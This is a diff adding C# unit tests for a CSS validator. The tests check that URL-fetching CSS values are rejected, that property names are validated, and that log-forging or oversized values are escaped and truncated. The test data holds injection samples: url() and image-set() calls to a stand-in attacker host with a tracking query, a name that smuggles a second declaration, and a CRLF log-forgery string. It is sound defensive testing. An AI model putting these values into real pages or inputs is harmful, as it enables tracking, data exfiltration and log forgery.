@@ -40,6 +40,55 @@ public class CssValidatorTests
     public void IsSafe_RejectsInjection(string value)
         => Assert.IsFalse(BmotionCssValidator.IsSafe(value));
 
+    // A value that makes the browser fetch a URL lets untrusted input send requests anywhere (tracking, exfiltration).
+    [TestMethod]
+    [DataRow("url(https://attacker.example/t?u=victim)")]
+    [DataRow("URL( 'https://attacker.example' )")]
+    [DataRow("src(\"https://attacker.example\")")]
+    [DataRow("image(\"https://attacker.example/a.png\")")]
+    [DataRow("image-set(\"https://attacker.example/a.png\" 1x)")]
+    [DataRow("-webkit-image-set(\"https://attacker.example/a.png\" 1x)")]
+    [DataRow("linear-gradient(red, blue), url(//attacker.example)")]
+    public void IsSafe_RejectsUrlFetches(string value)
+        => Assert.IsFalse(BmotionCssValidator.IsSafe(value));
+
+    [TestMethod]
+    [DataRow("outline")]
+    [DataRow("background-position")]
+    [DataRow("letterSpacing")]
+    [DataRow("--accent")]
+    [DataRow("--my_var-2")]
+    public void IsSafeName_AllowsPropertyNames(string name)
+        => Assert.IsTrue(BmotionCssValidator.IsSafeName(name));
+
+    [TestMethod]
+    [DataRow("")]
+    [DataRow("x;background-image:url(//evil);y")]
+    [DataRow("--a:0;background:red;--b")]
+    [DataRow("--a b")]
+    [DataRow("color\n")]
+    [DataRow("--a}")]
+    public void IsSafeName_RejectsAnythingThatCanEndTheDeclaration(string name)
+        => Assert.IsFalse(BmotionCssValidator.IsSafeName(name));
+
+    [TestMethod]
+    public void Quote_EscapesWhatCouldForgeALogLine()
+    {
+        var quoted = BmotionCssValidator.Quote("red\r\n[info] Admin login ok\u2028\u202Eevil");
+
+        Assert.IsFalse(quoted.Any(c => char.IsControl(c) || c is '\u2028' or '\u202E'));
+        Assert.AreEqual("red\\u000d\\u000a[info] Admin login ok\\u2028\\u202eevil", quoted);
+    }
+
+    [TestMethod]
+    public void Quote_CutsAHugeValueShort()
+    {
+        var quoted = BmotionCssValidator.Quote(new string('a', 5_000_000));
+
+        Assert.IsTrue(quoted.Length < 200, quoted);
+        StringAssert.Contains(quoted, "5000000 characters");
+    }
+
     // ── Integration with the component ────────────────────────────────────────
 
     private static RenderFragment Div => b =>
